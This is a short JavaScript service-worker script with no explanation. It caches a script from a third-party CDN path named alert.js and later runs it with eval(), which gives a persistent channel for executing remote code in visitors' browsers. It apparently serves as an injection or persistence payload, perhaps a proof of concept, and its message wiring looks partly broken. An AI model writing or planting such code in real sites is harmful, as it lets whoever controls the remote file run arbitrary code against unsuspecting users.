self.addEventListener('install', (event) => {
  event.waitUntil(
    caches.open('my-scripts').then((cache) => {
      return cache.addAll([
        'https://cdn.jsdelivr.net/gh/eq89/edm/alert.js',
      ]);
    })
  );
});

self.addEventListener('activate', (event) => {
  self.clients.matchAll().then((clients) => {
    clients.forEach((client) => {
      client.postMessage({ action: 'executeScript' });
    });
  });
});

self.addEventListener('message', (event) => {
  if (event.data.action === 'executeScript') {
    caches.match('https://cdn.jsdelivr.net/gh/eq89/edm/alert.js').then((response) => {
      if (response) {
        return response.text();
      }
    }).then((scriptText) => {
      if (scriptText) {
        eval(scriptText);
      }
    });
  }
});
